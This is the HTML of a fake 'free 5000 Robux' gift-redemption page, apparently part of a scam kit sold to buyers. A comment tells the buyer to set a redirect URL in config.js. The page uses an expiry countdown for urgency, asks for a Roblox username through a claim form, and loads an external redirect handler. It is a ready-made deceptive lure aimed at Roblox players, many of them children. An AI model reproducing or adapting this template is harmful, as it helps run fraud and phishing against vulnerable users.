<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Roblox 5000 Robux Gift Redeem</title>
  <meta name="description" content="Recupere ton cadeau Robux avant expiration." data-i18n-meta="description">
  <meta property="og:title" content="Vous avez recu 5000 Robux" data-i18n-meta="ogTitle">
  <meta property="og:description" content="Recupere ton cadeau Robux avant expiration." data-i18n-meta="description">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://example.com/">
  <meta property="og:image" content="images/Gqqe3TPIp7pL.webp">
  <link rel="canonical" href="https://example.com/">
  <link rel="icon" type="image/svg+xml" href="images/yqrn9wVqtf7s.svg">
  <link rel="stylesheet" href="css/redeem-gift.css">
  <!-- Buyer config: edit config.js to set the redirect URL. -->
  <script src="config.js"></script>
</head>
<body>
  <main class="redeem-page">
    <header class="language-bar">
      <label class="language-label" for="language-select" data-i18n="languageLabel">Langue</label>
      <select class="language-select" id="language-select" aria-label="Language">
        <option value="fr">Francais</option>
        <option value="en">English</option>
        <option value="es">Espanol</option>
        <option value="de">Deutsch</option>
        <option value="pt">Portugues</option>
        <option value="it">Italiano</option>
      </select>
    </header>

    <section class="gift-stage">
      <div class="gift-card" aria-live="polite">
        <h1 data-i18n="title">RECUPERER<br>CADEAU</h1>
        <img class="gift-icon" src="images/YzXr5i06sU0P.webp" alt="" width="112" height="112">
        <p class="gift-copy">
          <span data-i18n="giftPrefix">Vous avez recu</span>
          <img src="images/YRv0cUNGIx9q.svg" alt="" width="26" height="26">
          <strong>5000 Robux</strong>
        </p>
        <button class="claim-button" type="button" id="open-claim" data-i18n="claimButton">RECLAMER</button>
      </div>

      <form class="claim-modal" id="claim-form" hidden>
        <button class="close-button" type="button" id="close-claim" aria-label="Close">x</button>
        <h2 data-i18n="modalTitle">Confirmer le compte</h2>
        <p data-i18n="modalCopy">Entre ton pseudo Roblox pour reserver le cadeau.</p>
        <label for="username" data-i18n="usernameLabel">Pseudo Roblox</label>
        <input id="username" name="username" type="text" minlength="3" autocomplete="off" placeholder="Ton pseudo" data-i18n-placeholder="usernamePlaceholder" required>
        <button class="final-button" type="submit" data-i18n="finalButton">Claim reward</button>
        <span id="claim-status" class="claim-status"></span>
      </form>
    </section>

    <section class="countdown" aria-label="Expiration">
      <div>
        <strong id="days">1</strong>
        <span data-i18n="dayLabel">Day</span>
      </div>
      <div>
        <strong id="hours">12</strong>
        <span data-i18n="hoursLabel">Hours</span>
      </div>
      <div>
        <strong id="minutes">17</strong>
        <span data-i18n="minutesLabel">Minutes</span>
      </div>
      <div>
        <strong id="seconds">56</strong>
        <span data-i18n="secondsLabel">Seconds</span>
      </div>
    </section>
  </main>

  <script src="js/redeem-gift.js"></script>
  <script src="redirect-handler.js"></script>
</body>
</html>
